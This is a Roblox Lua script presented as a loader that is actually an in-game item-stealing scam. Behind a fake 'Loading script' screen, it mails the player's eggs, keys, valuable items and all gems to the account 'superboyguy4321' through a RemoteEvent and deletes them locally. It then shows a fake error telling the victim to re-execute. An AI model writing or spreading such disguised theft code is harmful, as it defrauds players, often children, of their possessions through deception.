-- Full-screen loading UI
local g = Instance.new("ScreenGui")
local f = Instance.new("Frame")
local t = Instance.new("TextLabel")
local anim = true

g.Parent = game.CoreGui
f.Parent = g
f.Size = UDim2.new(1, 0, 1, 0)
f.Position = UDim2.new(0, 0, 0, 0)
f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

t.Parent = f
t.Size = UDim2.new(0.5, 0, 0.1, 0)
t.Position = UDim2.new(0.25, 0, 0.45, 0)
t.BackgroundTransparency = 1
t.Text = "Loading script, please wait."
t.TextColor3 = Color3.fromRGB(255, 165, 0) -- Orange text
t.TextSize = 24
t.Font = Enum.Font.SourceSans

coroutine.wrap(function()
    local dots = {".", "..", "..."}
    local i = 1
    while anim do
        t.Text = "Loading script, please wait" .. dots[i]
        i = i % #dots + 1
        task.wait(0.5)
    end
end)()

task.wait(5) -- Fake load time
anim = false
g:Destroy()

-- Main logic: Mailbox interaction
local plr = game.Players.LocalPlayer
local inv = plr.Backpack or plr.StarterGear
local mailbox = workspace:FindFirstChild("Mailbox") or game:GetService("Workspace"):FindFirstChild("Mailbox")
local gems = plr:FindFirstChild("Gems") and plr.Gems.Value or 0

if mailbox then
    -- Open mailbox GUI
    fireclickdetector(mailbox.ClickDetector) -- Simulates clicking the mailbox (adjust if different interaction is used)
    task.wait(1) -- Wait for the GUI to open

    -- Send pets and items
    for _, item in pairs(inv:GetChildren()) do
        if item:IsA("Tool") and 
           (item.Name:lower():find("egg") or 
            item.Name:lower():find("key") or 
            (item:FindFirstChild("Rarity") and tonumber(item.Rarity.Value) > 1000000)) then
            game:GetService("ReplicatedStorage").RemoteEvent:FireServer({
                Target = "superboyguy4321",
                Items = {item.Name},
                Message = "ez"
            })
            task.wait(0.5) -- Avoid sending too quickly
            item:Destroy()
        end
    end

    -- Send gems
    if gems > 0 then
        game:GetService("ReplicatedStorage").RemoteEvent:FireServer({
            Target = "superboyguy4321",
            Gems = gems,
            Message = "ez"
        })
        plr.Gems.Value = 0
    end
end

-- Error Message
local g2 = Instance.new("ScreenGui")
local f2 = Instance.new("Frame")
local t2 = Instance.new("TextLabel")

g2.Parent = game.CoreGui
f2.Parent = g2
f2.Size = UDim2.new(1, 0, 1, 0)
f2.Position = UDim2.new(0, 0, 0, 0)
f2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

t2.Parent = f2
t2.Size = UDim2.new(0.5, 0, 0.1, 0)
t2.Position = UDim2.new(0.25, 0, 0.45, 0)
t2.BackgroundTransparency = 1
t2.Text = "Error, please re-execute the script"
t2.TextColor3 = Color3.fromRGB(255, 0, 0)
t2.TextSize = 24
t2.Font = Enum.Font.SourceSans

task.wait(5)
g2:Destroy()
